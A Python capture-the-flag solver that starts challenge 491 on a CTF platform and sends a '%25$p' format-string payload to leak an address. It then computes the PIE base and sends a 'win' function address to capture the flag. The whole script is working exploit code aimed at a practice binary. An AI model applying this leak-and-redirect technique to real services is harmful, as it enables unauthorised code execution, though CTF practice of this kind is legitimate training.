import sys, json, re, time, socket
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
sys.path.insert(0, r"D:\ctf-index")
from cylab2 import CyLab

WIN_OFF = 0x1376
MAIN_OFF = 0x1418
cy = CyLab(delay=0.8)
cy.login()
cy.req("PUT", "/api/challenges/491/instance/?source=library")
host = port = None
for _ in range(12):
    time.sleep(2)
    st, b = cy.req("GET", "/api/challenges/491/instance/")
    d = json.loads(b) if b.startswith("{") else {}
    if d.get("status") == "RUNNING":
        m = re.search(r"([A-Za-z0-9][A-Za-z0-9.\-]*\.net)\s+`?(\d{4,5})", d.get("description") or "")
        if m:
            host, port = m.group(1), int(m.group(2))
            break
print("cible:", host, port)
for attempt in range(3):
    s = socket.create_connection((host, port), timeout=20)
    s.settimeout(6)
    time.sleep(0.4)
    try:
        s.recv(4096)
    except Exception:
        pass
    s.sendall(b"%25$p\n")
    time.sleep(0.7)
    out = b""
    try:
        while True:
            c = s.recv(8192)
            if not c:
                break
            out += c
            if b"0x12345" in out:
                break
    except Exception:
        pass
    txt = out.decode("utf-8", "replace")
    m = re.search(r"0x[0-9a-f]{8,12}", txt)
    if not m:
        print("pas de leak:", txt[:120])
        s.close()
        continue
    val = int(m.group(0), 16)
    base = val - MAIN_OFF
    win = base + WIN_OFF
    print(f"leak={hex(val)} base={hex(base)} win={hex(win)}")
    s.sendall((hex(win) + "\n").encode())
    time.sleep(1.0)
    r = b""
    try:
        while True:
            c = s.recv(8192)
            if not c:
                break
            r += c
    except Exception:
        pass
    s.close()
    rt = r.decode("utf-8", "replace")
    print("reponse:", rt[:300].replace("\n", " "))
    fl = re.search(r"(?:academy|picoCTF)\{[^}]*\}", rt)
    if fl:
        print("FLAG:", fl.group(0))
        break
